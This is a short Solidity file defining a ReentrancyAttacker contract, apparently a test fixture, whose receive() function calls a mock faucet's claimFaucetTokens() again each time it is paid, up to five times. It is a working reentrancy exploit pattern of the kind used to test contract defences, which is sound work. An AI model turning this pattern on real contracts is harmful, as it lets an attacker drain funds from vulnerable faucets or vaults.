// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

interface IMockFaucet {
    function claimFaucetTokens() external;
}

contract ReentrancyAttacker {
    IMockFaucet public faucet;
    uint public callsMade;

    constructor(address _faucet) {
        faucet = IMockFaucet(_faucet);
    }

    function attack() external {
        faucet.claimFaucetTokens();
    }

    // Re-enter when receiving ETH from the faucet
    receive() external payable {
        if (callsMade < 5) { // Limit to prevent infinite loop in test
            callsMade++;
            faucet.claimFaucetTokens();
        }
    }
}